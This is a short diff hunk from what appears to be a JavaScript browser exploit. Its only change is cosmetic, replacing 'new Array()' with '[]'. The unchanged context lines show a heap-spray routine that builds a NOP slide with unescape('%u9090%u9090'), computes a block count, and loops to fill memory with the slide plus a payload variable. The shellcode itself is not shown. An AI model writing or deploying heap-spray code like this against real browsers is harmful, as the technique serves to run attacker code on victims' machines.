@@ -27,7 +27,7 @@ var spraySlideSize = heapBlockSize - (payLoadSize+0x38);
 var spraySlide = unescape("%u9090%u9090"); 
 spraySlide = getSpraySlide(spraySlide,spraySlideSize); 
 heapBlocks = (heapSprayToAddress - 0x400000)/heapBlockSize; 
-memory = new Array(); 
+memory = [];
 for (i=0;i<heapBlocks;i++) 
 { 
   memory = spraySlide + payLoadCode; 
